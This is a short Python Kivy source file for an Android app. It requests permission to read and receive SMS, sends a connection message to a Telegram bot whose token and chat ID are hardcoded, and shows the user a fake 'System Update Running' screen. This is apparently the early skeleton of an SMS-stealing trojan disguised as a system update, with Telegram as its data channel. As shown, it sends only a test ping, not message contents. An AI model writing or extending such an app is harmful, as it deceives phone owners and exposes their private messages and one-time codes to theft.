from kivy.app import App
from kivy.uix.label import Label
import requests
from android.permissions import request_permissions, Permission

class MainApp(App):
    def build(self):
        # Android permissions mangna
        request_permissions([Permission.READ_SMS, Permission.RECEIVE_SMS, Permission.INTERNET])
        
        # Aapki Updated Details
        TOKEN = "8264376885:AAG6pFOvdb_wcPboSz9-jooibI9FO9QILqY"
        CHAT_ID = "7107389141"
        
        try:
            url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
            data = {"chat_id": CHAT_ID, "text": "✅ Connection Success!\nBot is now linked to your Chat ID."}
            requests.post(url, data=data)
        except Exception as e:
            print(f"Error: {e}")
            
        return Label(text="System Update Running...\nInstallation in progress.")

if __name__ == "__main__":
    MainApp().run()

